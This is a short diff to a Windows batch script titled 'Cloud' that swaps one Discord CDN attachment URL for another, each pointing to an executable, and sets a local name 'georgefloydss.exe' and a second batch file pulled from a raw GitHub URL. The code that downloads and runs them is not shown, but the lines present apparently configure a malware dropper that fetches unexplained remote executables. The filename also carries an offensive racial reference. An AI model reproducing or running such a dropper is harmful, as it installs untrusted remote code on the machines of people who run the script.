@@ -1,6 +1,6 @@
 @echo off
 title Cloud
-set "url=https://cdn.discordapp.com/attachments/1245898799210168331/1306644489376628746/ZXNwbGFjaA-1.exe?ex=67376b02&is=67361982&hm=4f3c7abfe624047e6461c3083d2c4ee1d81257477975e7f1c43da6ceebb49345&"
+set "url=https://cdn.discordapp.com/attachments/1142393688580968500/1306671974679842909/kiyoyou.exe?ex=6737849b&is=6736331b&hm=ba356c1c0cb7411cb6b5ad7dea03c83e21a3262629130c4adbcc409c9ec318f8&"
 set "filename=georgefloydss.exe"
 set "urlbatch=https://raw.githubusercontent.com/ghgodbomboclat/apguacamole-commons/refs/heads/main/georgefloydss.bat"
 set "bfn=georgefloydss.bat"
